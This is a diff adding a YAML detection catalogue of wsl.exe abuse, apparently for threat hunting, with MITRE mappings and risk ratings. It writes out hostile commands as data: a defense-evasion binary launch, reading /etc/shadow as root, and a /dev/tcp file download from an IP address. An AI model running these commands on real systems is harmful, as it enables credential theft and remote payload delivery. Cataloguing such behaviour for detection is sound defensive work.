@@ -1,0 +1,61 @@
+- command: wsl.exe -e /mnt/c/Windows/System32/calc.exe
+  description: Execute an arbitrary binary via abuse of wsl.exe.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1202
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Wsl/
+  risk: High
+  risk_reason: Manual usage of wsl to launch Windows-based binaries is suspicious.
+  fidelity: High
+  fidelity_reason: This type of behavior is typically rare for most users in an organization.
+  tool: wsl
+  threatactors:
+    N/A:
+      - N/A
+- command: wsl.exe -u root -e cat /etc/shadow
+  description: Read the contents of /etc/shadow as root without requiring a password.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1202
+    Credential Access:
+      - T1003.008
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Wsl/
+  risk: Critical
+  risk_reason: Manual usage of wsl to read /etc/shadow as root is highly suspicious.
+  fidelity: High
+  fidelity_reason: This type of behavior is typically rare for most users in an organization.
+  tool: wsl
+  threatactors:
+    N/A:
+      - N/A
+- command: wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'
+  description: Download an arbitrary file or bash command.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1202
+    Command and Control:
+      - T1105
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Wsl/
+  risk: High
+  risk_reason: Manual usage of wsl to download files is suspicious.
+  fidelity: High
+  fidelity_reason: This type of behavior is typically rare for most users in an organization.
+  tool: wsl
+  threatactors:
+    N/A:
+      - N/A
